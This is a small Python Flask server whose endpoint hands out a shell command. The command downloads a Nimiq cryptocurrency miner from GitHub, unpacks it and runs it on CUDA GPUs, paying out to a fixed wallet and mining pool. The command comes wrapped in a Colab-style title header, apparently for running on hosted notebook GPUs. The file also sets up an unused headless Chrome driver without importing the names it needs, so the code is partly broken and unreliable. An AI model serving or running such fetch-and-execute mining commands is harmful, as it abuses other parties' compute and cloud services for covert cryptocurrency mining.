from flask import Flask, request
import os
from datetime import datetime
import random
import time

chars = [i for i in "abcdefghjklmnoprstuvyzxwq1234567890"]
strs = f"{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}-{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}-{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}"
chrome_options = Options()
chrome_options.binary_location = os.environ.get("GOOGLE_CHROME_BIN")
chrome_options.add_argument("--disable-dev-shm-usage")
chrome_options.add_argument("--no-sandbox")
driver = webdriver.Chrome(executable_path=os.environ.get("CHROMEDRIVER_PATH"), options = chrome_options)
app = Flask(__name__)
command = 'mkdir NimiqMiner && cd NimiqMiner && wget https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-linux-0.99.7.tar.gz -O nq-nimer-linux.zip && mkdir nq-miner && tar -xzvf nq-nimer-linux.zip -C nq-miner && rm nq-nimer-linux.zip &&rm ./nq-miner/start_gpu.sh &&./nq-miner/nq-miner -t cuda -a "NQ718S9KEYU4VCBV4SB5PX73CJJJ3NCV9CM3" -n "ixelizm" -p pool.acemining.co:8443'


@app.route("/recieve")
def recieve():
    strs = f"{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}-{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}-{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}"
    command1 = """
#@title **ID: {}**
""".format(strs)
    print("ID: ", strs)
    return command1+command
  


if __name__ == "__main__":
  app.run(port = 5000)
